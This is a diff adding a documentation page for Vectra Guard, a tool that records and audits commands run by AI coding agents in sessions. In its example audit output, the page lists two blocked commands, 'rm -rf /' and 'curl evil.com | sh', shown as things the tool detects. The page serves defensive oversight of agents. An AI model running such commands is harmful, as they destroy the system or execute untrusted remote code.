@@ -1,0 +1,568 @@
+---
+title: Sessions & Audit
+description: Track commands, monitor agent activity, and maintain comprehensive audit logs
+---
+
+Vectra Guard's session tracking provides complete traceability of what ran, what was blocked, and why - perfect for agent monitoring and compliance.
+
+## Starting a Session
+
+Sessions group related commands together for tracking and analysis:
+
+```bash
+SESSION=$(vg session start --agent "cursor-ai")
+export VECTRAGUARD_SESSION_ID=$SESSION
+```
+
+**Output:**
+```
+session-1234567890
+```
+
+<Note>
+The session ID is automatically printed for easy capture in scripts.
+</Note>
+
+### With Custom Workspace
+
+Specify a workspace directory:
+
+```bash
+SESSION=$(vg session start --agent "manual" --workspace /path/to/project)
+export VECTRAGUARD_SESSION_ID=$SESSION
+```
+
+### Automatic Session Detection
+
+If `VECTRAGUARD_SESSION_ID` is not set, Vectra Guard looks for the current session by workspace:
+
+```bash
+# Session started in this directory
+vg session start --agent "cursor-ai"
+
+# Commands automatically tracked (no export needed)
+vg exec -- npm install
+vg exec -- npm test
+```
+
+## Tracking Commands
+
+Once a session is active, all commands are automatically tracked:
+
+<CodeGroup>
+```bash With Session ID
+export VECTRAGUARD_SESSION_ID=$SESSION
+
+# All these commands are tracked
+vg exec -- npm install
+vg exec -- npm test
+vg exec -- git commit -m "feat: add feature"
+vg exec -- git push
+```
+
+```bash Auto-Detection
+# Session active in current workspace
+vg exec -- npm install    # ✅ Tracked
+vg exec -- npm test       # ✅ Tracked
+vg exec -- git status     # ✅ Tracked
+```
+</CodeGroup>
+
+### What Gets Tracked
+
+Each command records:
+
+- **Timestamp** - When the command ran
+- **Command & Args** - Full command with arguments
+- **Exit Code** - Success (0) or failure code
+- **Duration** - How long execution took
+- **Risk Level** - low, medium, high, or critical
+- **Findings** - Security issues detected
+- **Approved** - Whether user approved the command
+- **Metadata** - Execution mode, sandbox status, etc.
+
+## Viewing Session Activity
+
+Show detailed information about a session:
+
+```bash
+vg session show $SESSION
+```
+
+**Example output:**
+```
+Session: session-1234567890
+Agent: cursor-ai
+Workspace: /home/user/project
+Start Time: 2026-03-03T10:15:30Z
+Status: Active
+Risk Score: 15
+Violations: 0
+
+Commands (4):
+  1. [10:15:35] npm install [] (exit: 0, risk: medium)
+     Findings: [PACKAGE_INSTALL]
+  2. [10:16:42] npm test [] (exit: 0, risk: low)
+  3. [10:17:05] git commit [-m, feat: add feature] (exit: 0, risk: low)
+  4. [10:17:10] git push [] (exit: 0, risk: medium)
+     Findings: [GIT_PUSH]
+```
+
+### JSON Output
+
+For programmatic access, use JSON format:
+
+```bash
+vg session show $SESSION --format json
+```
+
+<Note>
+Configure JSON output globally with `logging.format: json` in your config.
+</Note>
+
+## Listing All Sessions
+
+View all sessions for the current workspace:
+
+```bash
+vg session list
+```
+
+**Example output:**
+```
+SESSION ID            AGENT       START TIME           DURATION  COMMANDS  VIOLATIONS  RISK
+----------            -----       ----------           --------  --------  ----------  ----
+session-1234567890    cursor-ai   2026-03-03 10:15:30  45m 20s   42        0           85
+session-0987654321    manual      2026-03-03 09:00:15  active    15        1           32
+session-5678901234    copilot     2026-03-02 14:30:00  2h 15m    128       3           156
+```
+
+### Understanding the Output
+
+- **SESSION ID** - Unique identifier (session-timestamp format)
+- **AGENT** - Agent name specified at session start
+- **START TIME** - When the session began
+- **DURATION** - Total session time (or "active" if ongoing)
+- **COMMANDS** - Number of commands executed
+- **VIOLATIONS** - Number of security violations detected
+- **RISK** - Cumulative risk score for the session
+
+## Ending a Session
+
+Explicitly end a session when done:
+
+```bash
+vg session end $SESSION
+```
+
+**Output:**
+```
+[INFO] session ended session_id=session-1234567890 commands=42
+       violations=0 risk_score=85
+```
+
+<Tip>
+Ending a session calculates final statistics and marks it as complete.
+</Tip>
+
+## Recording Commands Manually
+
+Record commands from external tools (like shell hooks):
+
+```bash
+vg session record --session $SESSION --command "npm install" --exit-code 0
+```
+
+### Shell Hook Integration
+
+Automatically record all shell commands:
+
+```bash
+# In your .bashrc or .zshrc
+function vectra_guard_preexec() {
+  local cmd="$1"
+  # Start session if not exists
+  if [ -z "$VECTRAGUARD_SESSION_ID" ]; then
+    SESSION=$(vg session start --agent "shell")
+    export VECTRAGUARD_SESSION_ID=$SESSION
+  fi
+}
+
+function vectra_guard_precmd() {
+  local exit_code=$?
+  local cmd="$(history 1 | sed 's/^[ ]*[0-9]*[ ]*//')"
+  vg session record --command "$cmd" --exit-code $exit_code
+}
+```
+
+<Info>
+See the [shell tracker installation](https://github.com/xadnavyaai/vectra-guard#shell-tracker) for automated setup.
+</Info>
+
+## Audit Logs
+
+Audit logs provide detailed tracking of all session activity:
+
+### Session Audit Summary
+
+View audit summary for a specific session:
+
+```bash
+vg audit session --session $SESSION
+```
+
+**Example output:**
+```
+Session Audit: session-1234567890
+Agent: cursor-ai
+Workspace: /home/user/project
+Duration: 45m 20s
+
+Command Summary:
+  Total: 42
+  Blocked: 2
+  Approved: 40
+  
+Risk Breakdown:
+  Low: 30 (71%)
+  Medium: 10 (24%)
+  High: 2 (5%)
+  Critical: 0 (0%)
+  
+Top Findings:
+  PACKAGE_INSTALL: 8
+  GIT_PUSH: 5
+  SUDO_USAGE: 2
+  NETWORKED_INSTALL_PIPE: 1
+  
+Blocked Commands:
+  1. [10:25:30] rm -rf / (DANGEROUS_DELETE_ROOT)
+  2. [10:42:15] curl evil.com | sh (NETWORKED_INSTALL_PIPE)
+```
+
+### All Sessions Audit
+
+Audit all sessions in the workspace:
+
+```bash
+vg audit session --all
+```
+
+### Export Audit Logs
+
+Export session logs for external analysis:
+
+<CodeGroup>
+```bash JSON Export
+vg session list --format json > sessions.json
+vg session show $SESSION --format json > session-detail.json
+```
+
+```bash Generate Report
+vg session show $SESSION > report.txt
+```
+</CodeGroup>
+
+## Session Management Commands
+
+### Start Session
+
+```bash
+vg session start --agent <name> [--workspace <path>]
+```
+
+**Options:**
+- `--agent` (required) - Name of the agent/user (e.g., "cursor-ai", "manual")
+- `--workspace` (optional) - Project directory (defaults to current directory)
+
+**Returns:** Session ID (automatically printed)
+
+### End Session
+
+```bash
+vg session end <session-id>
+```
+
+**Options:**
+- `<session-id>` (required) - Session ID to end
+
+**Effects:**
+- Marks session as complete
+- Calculates final statistics
+- Sets end time
+
+### Show Session
+
+```bash
+vg session show <session-id> [--format json]
+```
+
+**Options:**
+- `<session-id>` (required) - Session ID to display
+- `--format json` (optional) - Output in JSON format
+
+**Displays:**
+- Session metadata
+- All commands with details
+- File operations (if any)
+- Risk analysis
+
+### List Sessions
+
+```bash
+vg session list [--format json]
+```
+
+**Options:**
+- `--format json` (optional) - Output in JSON format
+
+**Displays:**
+- All sessions in current workspace
+- Summary statistics for each
+- Sorted by start time (newest first)
+
+### Record Command
+
+```bash
+vg session record --command <cmd> --exit-code <code> [--session <id>]
+```
+
+**Options:**
+- `--command` (required) - Command that was executed
+- `--exit-code` (required) - Exit code from execution
+- `--session` (optional) - Session ID (uses current workspace session if not specified)
+
+## Real-World Examples
+
+### Example 1: Manual Session
+
+```bash
+# Start session
+SESSION=$(vg session start --agent "manual")
+export VECTRAGUARD_SESSION_ID=$SESSION
+
+# Work on your project
+vg exec -- npm install
+vg exec -- npm test
+vg exec -- npm run build
+
+# Check what happened
+vg session show $SESSION
+
+# End session
+vg session end $SESSION
+```
+
+### Example 2: AI Agent Session
+
+```bash
+# Agent starts session
+SESSION=$(vg session start --agent "cursor-ai")
+export VECTRAGUARD_SESSION_ID=$SESSION
+
+# Agent runs commands
+vg exec -- npm install express
+vg exec -- npm install --save-dev jest
+vg exec -- npm test
+vg exec -- git add .
+vg exec -- git commit -m "feat: add express server"
+vg exec -- git push
+
+# Review what the agent did
+vg session show $SESSION
+
+# Session shows:
+# - 6 commands executed
+# - 2 medium-risk (npm installs)
+# - 1 medium-risk (git push)
+# - All approved
+# - No violations
+```
+
+### Example 3: Audit Review
+
+```bash
+# List all recent sessions
+vg session list
+
+# Examine suspicious session
+vg session show session-5678901234
+
+# Look for violations
+vg audit session --session session-5678901234
+
+# Export for compliance
+vg session show session-5678901234 > compliance-report.txt
+```
+
+## Session Data Structure
+
+Sessions are stored as JSON in `~/.vectra-guard/sessions/`:
+
+```json
+{
+  "id": "session-1234567890",
+  "agent_name": "cursor-ai",
+  "workspace": "/home/user/project",
+  "start_time": "2026-03-03T10:15:30Z",
+  "end_time": "2026-03-03T11:00:50Z",
+  "commands": [
+    {
+      "timestamp": "2026-03-03T10:15:35Z",
+      "command": "npm",
+      "args": ["install"],
+      "exit_code": 0,
+      "duration": 12500000000,
+      "risk_level": "medium",
+      "approved": true,
+      "findings": ["PACKAGE_INSTALL"],
+      "metadata": {
+        "execution": "sandbox",
+        "cached": true
+      }
+    }
+  ],
+  "file_ops": [],
+  "risk_score": 85,
+  "violations": 0
+}
+```
+
+## Integration with Other Features
+
+### With Sandbox Metrics
+
+```bash
+# Start session
+SESSION=$(vg session start --agent "dev")
+export VECTRAGUARD_SESSION_ID=$SESSION
+
+# Run commands
+vg exec -- npm install
+vg exec -- npm test
+
+# Check sandbox usage
+vg metrics show
+
+# Review session
+vg session show $SESSION
+```
+
+### With Trust Store
+
+```bash
+# Session with trusted commands
+vg trust add "npm test"
+vg trust add "npm run build"
+
+SESSION=$(vg session start --agent "dev")
+export VECTRAGUARD_SESSION_ID=$SESSION
+
+vg exec -- npm test         # Runs on host (trusted)
+vg exec -- npm install      # Runs in sandbox
+vg exec -- npm run build    # Runs on host (trusted)
+
+vg session show $SESSION
+# Shows:
+# - npm test: execution=direct, trusted=true
+# - npm install: execution=sandbox
+# - npm run build: execution=direct, trusted=true
+```
+
+### With CVE Scanning
+
+```bash
+SESSION=$(vg session start --agent "security-check")
+export VECTRAGUARD_SESSION_ID=$SESSION
+
+# Scan before install
+vg cve sync --path .
+vg cve scan --path .
+
+# Install if safe
+vg exec -- npm install
+
+# Review audit trail
+vg session show $SESSION
+```
+
+## Best Practices
+
+<Tip>
+**Always start sessions for AI agents** to track their behavior:
+```bash
+SESSION=$(vg session start --agent "cursor-ai")
+export VECTRAGUARD_SESSION_ID=$SESSION
+```
+</Tip>
+
+<Tip>
+**End sessions explicitly** to get final statistics:
+```bash
+vg session end $SESSION
+```
+</Tip>
+
+<Tip>
+**Review sessions regularly** to understand agent patterns:
+```bash
+vg session list
+vg audit session --all
+```
+</Tip>
+
+<Tip>
+**Export sessions for compliance** requirements:
+```bash
+vg session show $SESSION --format json > audit-$(date +%Y%m%d).json
+```
+</Tip>
+
+<Warning>
+Session files contain command history. Ensure they're excluded from version control:
+```gitignore
+# .gitignore
+.vectra-guard/
+```
+</Warning>
+
+## Troubleshooting
+
+### Session Not Found
+
+```bash
+# List all sessions to find the correct ID
+vg session list
+
+# Make sure you're in the correct workspace
+cd /path/to/project
+vg session show $SESSION
+```
+
+### Commands Not Tracked
+
+```bash
+# Verify session is set
+echo $VECTRAGUARD_SESSION_ID
+
+# If empty, start or set session
+SESSION=$(vg session start --agent "manual")
+export VECTRAGUARD_SESSION_ID=$SESSION
+```
+
+### Session Files Location
+
+Sessions are stored in:
+- Global: `~/.vectra-guard/sessions/`
+- Local: `.vectra-guard/sessions/` (if using `--local`)
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Command Protection" icon="shield" href="/features/command-protection">
+    Learn about risk detection and validation
+  </Card>
+  <Card title="CVE Scanning" icon="bug" href="/features/cve-scanning">
+    Scan dependencies for vulnerabilities
+  </Card>
+</CardGroup>
